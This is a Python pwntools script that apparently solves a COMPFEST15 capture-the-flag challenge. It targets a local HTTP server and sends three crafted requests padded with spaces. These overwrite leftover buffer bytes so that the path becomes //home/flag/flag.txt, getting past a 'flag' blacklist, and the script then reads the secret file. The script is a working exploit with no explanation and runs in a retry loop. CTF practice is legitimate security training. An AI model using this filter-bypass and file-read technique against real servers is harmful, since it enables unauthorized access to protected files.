from pwn import *

context.log_level = "debug"
HOST, PORT = "127.0.0.1", 8080


def exploit():
    # Goal: GET //home/flag/flag.txt
    try:
        # =-=-=-= Initial Request =-=-=-=
        # from -> ''
        # to   -> 'GET  /home/xlag/xlag.txt'
        io = remote(HOST, PORT)
        payload = f"GET{' ' * (0x20-3)}/home/xlag/xlag.txt?password=fib HTTP/1.1"
        io.send(payload.encode())
        io.close()

        # =-=-=-= Bypass 'flag' blacklist #1 =-=-=-=
        # from -> 'GET  /home/xlag/xlag.txt'
        # to   -> 'GET  /home/xlag/flag.txt'
        io = remote(HOST, PORT)
        payload = f"GET{' ' * (0x20-3)}/home/xlag/f"
        io.send(payload.encode())
        io.close()

        # =-=-=-= Bypass 'flag' blacklist #2 =-=-=-=
        # from -> 'GET  /home/xlag/flag.txt'
        # to   -> 'GET //home/flag/flag.txt'
        io = remote(HOST, PORT)
        payload = f"GET{' ' * (0x20-4)}//home/f"
        io.send(payload.encode())

        # =-=-=-= Profit =-=-=-=
        prefix = b"COMPFEST15{"
        io.recvuntil(prefix, timeout=5)
        flag = prefix + io.recvuntil(b"}")

        log.success(f"flag: {flag.decode()}")
        io.close()
    except Exception as e:
        print(e)
        io.close()


while True:
    exploit()
    sleep(1)
